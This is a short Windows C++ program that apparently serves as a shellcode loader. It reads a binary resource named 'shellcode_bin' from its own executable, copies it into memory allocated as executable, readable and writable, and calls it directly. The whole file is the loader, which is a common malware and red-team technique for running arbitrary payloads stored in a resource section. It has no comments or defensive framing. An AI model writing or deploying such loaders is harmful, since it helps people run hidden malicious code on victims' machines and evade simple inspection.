#include <iostream>
#include <Windows.h>
#include "resource.h"

int main()
{
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_SHELLCODE_BIN1), L"shellcode_bin");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);

	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResouceData, shellcodeSize);
	((void(*)())exec)();

	return  0;
}